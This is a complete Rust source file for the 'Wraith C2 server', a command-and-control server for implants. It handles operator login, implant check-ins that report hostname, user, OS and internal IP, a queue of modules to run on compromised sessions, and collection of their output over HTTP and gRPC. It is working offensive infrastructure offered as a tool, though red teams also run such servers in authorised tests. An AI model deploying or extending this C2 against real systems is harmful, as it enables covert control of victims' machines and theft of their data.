use anyhow::{Context, Result};
use argon2::{
    password_hash::{rand_core::OsRng, PasswordHash, PasswordHasher, PasswordVerifier, SaltString},
    Argon2,
};
use axum::{
    extract::{Json, State},
    http::{HeaderMap, StatusCode},
    routing::post,
    Router,
};
use clap::{Parser, Subcommand};
use sqlx::{PgPool, Row};
use std::{
    collections::HashMap,
    net::SocketAddr,
    sync::{Arc, RwLock},
};
use tokio::net::TcpListener;
use tonic::{Request, Response, Status};
use tracing::info;
use uuid::Uuid;

use shared::{
    proto::{
        orchestrator_server::{Orchestrator, OrchestratorServer},
        Empty, SessionList, SessionSnapshot, SessionTaskList, SessionTasksRequest, TaskRequest,
        TaskResponse, TaskResult,
    },
    ImplantCheckin, ImplantCheckinResponse, ImplantTask, ImplantTaskResult, LoginRequest,
    LoginResponse,
};

// ── CLI ───────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(about = "Wraith C2 server")]
struct Args {
    /// PostgreSQL connection string (overrides DATABASE_URL env var)
    #[arg(long, env = "DATABASE_URL")]
    db: String,
    /// gRPC address for the operator client
    #[arg(long, default_value = "0.0.0.0:50051")]
    grpc_addr: String,
    /// HTTP address for login + implant check-ins
    #[arg(long, default_value = "0.0.0.0:8080")]
    http_addr: String,
    /// When set, implant routes require this token in X-Wraith-Token
    #[arg(long, env = "REDIRECTOR_TOKEN")]
    redirector_token: Option<String>,
    #[command(subcommand)]
    command: Option<Cmd>,
}

#[derive(Subcommand)]
enum Cmd {
    /// Create or reset an admin operator account
    ProvisionAdmin {
        #[arg(long, default_value = "admin")]
        username: String,
    },
}

// ── Shared state ──────────────────────────────────────────────────────────────

#[derive(Clone)]
struct AppState {
    db:               PgPool,
    /// token → (username, role)
    live_sessions:    Arc<RwLock<HashMap<String, (String, String)>>>,
    redirector_token: Option<String>,
}

impl AppState {
    fn verify_token(&self, token: &str) -> bool {
        self.live_sessions.read().unwrap().contains_key(token)
    }

    fn check_redirector(&self, headers: &HeaderMap) -> bool {
        match &self.redirector_token {
            None => true,
            Some(expected) => headers
                .get("x-wraith-token")
                .and_then(|v| v.to_str().ok())
                .map(|v| v == expected)
                .unwrap_or(false),
        }
    }
}

// ── Database helpers ──────────────────────────────────────────────────────────

async fn init_db(pool: &PgPool) -> Result<()> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS operators (
            username      TEXT PRIMARY KEY,
            role          TEXT NOT NULL,
            password_hash TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create operators table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS implant_sessions (
            session_id TEXT PRIMARY KEY,
            hostname   TEXT NOT NULL,
            username   TEXT NOT NULL,
            os         TEXT NOT NULL,
            arch       TEXT NOT NULL,
            ip         TEXT NOT NULL,
            profile    TEXT NOT NULL,
            last_seen  TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create implant_sessions table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS implant_tasks (
            task_id    TEXT PRIMARY KEY,
            session_id TEXT NOT NULL,
            module     TEXT NOT NULL,
            args       TEXT NOT NULL,
            status     TEXT NOT NULL DEFAULT 'pending',
            output     TEXT NOT NULL DEFAULT '',
            queued_at  TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create implant_tasks table")?;

    Ok(())
}

async fn upsert_session(pool: &PgPool, c: &ImplantCheckin, sid: &str) -> Result<()> {
    let now = chrono_now();
    sqlx::query(
        "INSERT INTO implant_sessions (session_id,hostname,username,os,arch,ip,profile,last_seen)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8)
         ON CONFLICT(session_id) DO UPDATE SET
           hostname=EXCLUDED.hostname, username=EXCLUDED.username,
           os=EXCLUDED.os, arch=EXCLUDED.arch,
           ip=EXCLUDED.ip, profile=EXCLUDED.profile, last_seen=EXCLUDED.last_seen",
    )
    .bind(sid)
    .bind(&c.hostname)
    .bind(&c.username)
    .bind(&c.os)
    .bind(&c.arch)
    .bind(&c.internal_ip)
    .bind(&c.profile)
    .bind(&now)
    .execute(pool)
    .await?;
    Ok(())
}

async fn pop_pending_tasks(pool: &PgPool, session_id: &str) -> Result<Vec<ImplantTask>> {
    let rows = sqlx::query(
        "SELECT task_id, module, args FROM implant_tasks
         WHERE session_id = $1 AND status = 'pending'",
    )
    .bind(session_id)
    .fetch_all(pool)
    .await?;

    let tasks: Vec<ImplantTask> = rows
        .iter()
        .map(|r| ImplantTask {
            task_id: r.get("task_id"),
            module:  r.get("module"),
            args:    serde_json::from_str(r.get::<&str, _>("args")).unwrap_or_default(),
        })
        .collect();

    for t in &tasks {
        sqlx::query("UPDATE implant_tasks SET status='sent' WHERE task_id=$1")
            .bind(&t.task_id)
            .execute(pool)
            .await?;
    }
    Ok(tasks)
}

async fn record_result(pool: &PgPool, r: &ImplantTaskResult) -> Result<()> {
    let status = if r.success { "completed" } else { "failed" };
    sqlx::query("UPDATE implant_tasks SET status=$1, output=$2 WHERE task_id=$3")
        .bind(status)
        .bind(r.output.to_string())
        .bind(&r.task_id)
        .execute(pool)
        .await?;
    Ok(())
}

fn chrono_now() -> String {
    chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC").to_string()
}

// ── HTTP handlers ─────────────────────────────────────────────────────────────

async fn handle_login(
    State(state): State<AppState>,
    Json(req): Json<LoginRequest>,
) -> Result<Json<LoginResponse>, StatusCode> {
    let row = sqlx::query("SELECT role, password_hash FROM operators WHERE username=$1")
        .bind(&req.username)
        .fetch_optional(&state.db)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let Some(row) = row else { return Err(StatusCode::UNAUTHORIZED) };
    let hash: String = row.get("password_hash");
    let role: String = row.get("role");

    let parsed = PasswordHash::new(&hash).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Argon2::default()
        .verify_password(req.password.as_bytes(), &parsed)
        .map_err(|_| StatusCode::UNAUTHORIZED)?;

    let token = Uuid::new_v4().to_string();
    state
        .live_sessions
        .write()
        .unwrap()
        .insert(token.clone(), (req.username.clone(), role.clone()));

    Ok(Json(LoginResponse { token, username: req.username, role }))
}

async fn handle_checkin(
    State(state): State<AppState>,
    headers: HeaderMap,
    Json(body): Json<ImplantCheckin>,
) -> Result<Json<ImplantCheckinResponse>, StatusCode> {
    if !state.check_redirector(&headers) {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let sid = body
        .session_id
        .clone()
        .unwrap_or_else(|| Uuid::new_v4().to_string());
    upsert_session(&state.db, &body, &sid)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let tasks = pop_pending_tasks(&state.db, &sid)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(ImplantCheckinResponse { session_id: sid, tasks }))
}

async fn handle_result(
    State(state): State<AppState>,
    headers: HeaderMap,
    Json(body): Json<ImplantTaskResult>,
) -> Result<StatusCode, StatusCode> {
    if !state.check_redirector(&headers) {
        return Err(StatusCode::UNAUTHORIZED);
    }
    record_result(&state.db, &body)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(StatusCode::OK)
}

// ── gRPC service ──────────────────────────────────────────────────────────────

struct GrpcApi {
    state: AppState,
}

impl GrpcApi {
    fn auth<T>(&self, req: &Request<T>) -> Result<(), Status> {
        let token = req
            .metadata()
            .get("authorization")
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.strip_prefix("Bearer "))
            .ok_or_else(|| Status::unauthenticated("missing token"))?;
        if !self.state.verify_token(token) {
            return Err(Status::unauthenticated("invalid token"));
        }
        Ok(())
    }
}

#[tonic::async_trait]
impl Orchestrator for GrpcApi {
    async fn list_sessions(
        &self,
        req: Request<Empty>,
    ) -> Result<Response<SessionList>, Status> {
        self.auth(&req)?;
        let rows = sqlx::query(
            "SELECT session_id,hostname,username,os,arch,ip,profile,last_seen
             FROM implant_sessions ORDER BY last_seen DESC",
        )
        .fetch_all(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        let cutoff = chrono::Utc::now() - chrono::Duration::minutes(2);
        let sessions = rows
            .iter()
            .map(|r| {
                let last_seen: String = r.get("last_seen");
                let active = chrono::DateTime::parse_from_str(&last_seen, "%Y-%m-%d %H:%M:%S UTC")
                    .map(|t| t.with_timezone(&chrono::Utc) > cutoff)
                    .unwrap_or(false);
                SessionSnapshot {
                    session_id:  r.get("session_id"),
                    hostname:    r.get("hostname"),
                    username:    r.get("username"),
                    os:          r.get("os"),
                    arch:        r.get("arch"),
                    internal_ip: r.get("ip"),
                    profile:     r.get("profile"),
                    last_seen,
                    active,
                }
            })
            .collect();

        Ok(Response::new(SessionList { sessions }))
    }

    async fn task_session(
        &self,
        req: Request<TaskRequest>,
    ) -> Result<Response<TaskResponse>, Status> {
        self.auth(&req)?;
        let r = req.into_inner();
        let task_id = Uuid::new_v4().to_string();
        let args_json = serde_json::to_string(&r.args).unwrap_or_default();
        sqlx::query(
            "INSERT INTO implant_tasks (task_id,session_id,module,args,status,queued_at)
             VALUES ($1,$2,$3,$4,'pending',$5)",
        )
        .bind(&task_id)
        .bind(&r.session_id)
        .bind(&r.module)
        .bind(&args_json)
        .bind(chrono_now())
        .execute(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(TaskResponse { task_id }))
    }

    async fn list_session_tasks(
        &self,
        req: Request<SessionTasksRequest>,
    ) -> Result<Response<SessionTaskList>, Status> {
        self.auth(&req)?;
        let session_id = req.into_inner().session_id;
        let rows = sqlx::query(
            "SELECT task_id,module,args,status,output,queued_at
             FROM implant_tasks WHERE session_id=$1 ORDER BY queued_at DESC",
        )
        .bind(&session_id)
        .fetch_all(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        let tasks = rows
            .iter()
            .map(|r| TaskResult {
                task_id:     r.get("task_id"),
                module:      r.get("module"),
                args:        serde_json::from_str(r.get::<&str, _>("args")).unwrap_or_default(),
                status:      r.get("status"),
                output_json: r.get("output"),
                queued_at:   r.get("queued_at"),
            })
            .collect();

        Ok(Response::new(SessionTaskList { tasks }))
    }
}

// ── main ──────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();
    let args = Args::parse();

    let pool = PgPool::connect(&args.db)
        .await
        .context("failed to connect to PostgreSQL")?;
    init_db(&pool).await?;

    if let Some(Cmd::ProvisionAdmin { username }) = &args.command {
        let password = generate_password();
        let hash = hash_password(&password)?;
        sqlx::query(
            "INSERT INTO operators (username,role,password_hash) VALUES ($1,'admin',$2)
             ON CONFLICT(username) DO UPDATE SET password_hash=EXCLUDED.password_hash",
        )
        .bind(username)
        .bind(&hash)
        .execute(&pool)
        .await?;
        println!("Admin user '{username}' provisioned.");
        println!("Password (shown once): {password}");
        return Ok(());
    }

    let state = AppState {
        db: pool.clone(),
        live_sessions: Arc::new(RwLock::new(HashMap::new())),
        redirector_token: args.redirector_token.clone(),
    };

    let http_app = Router::new()
        .route("/api/login",       post(handle_login))
        .route("/implant/checkin", post(handle_checkin))
        .route("/implant/result",  post(handle_result))
        .with_state(state.clone());

    let http_addr: SocketAddr = args.http_addr.parse()?;
    let http_listener = TcpListener::bind(http_addr).await?;
    info!("HTTP listening on {http_addr}");

    let grpc_addr: SocketAddr = args.grpc_addr.parse()?;
    info!("gRPC listening on {grpc_addr}");

    tokio::try_join!(
        async {
            axum::serve(http_listener, http_app)
                .await
                .context("HTTP server failed")
        },
        async {
            tonic::transport::Server::builder()
                .add_service(OrchestratorServer::new(GrpcApi { state }))
                .serve(grpc_addr)
                .await
                .context("gRPC server failed")
        },
    )?;

    Ok(())
}

fn hash_password(password: &str) -> Result<String> {
    let salt = SaltString::generate(&mut OsRng);
    Ok(Argon2::default()
        .hash_password(password.as_bytes(), &salt)
        .map_err(|e| anyhow::anyhow!("{e}"))?
        .to_string())
}

fn generate_password() -> String {
    use rand_core::RngCore;
    let mut bytes = [0u8; 16];
    OsRng.fill_bytes(&mut bytes);
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}
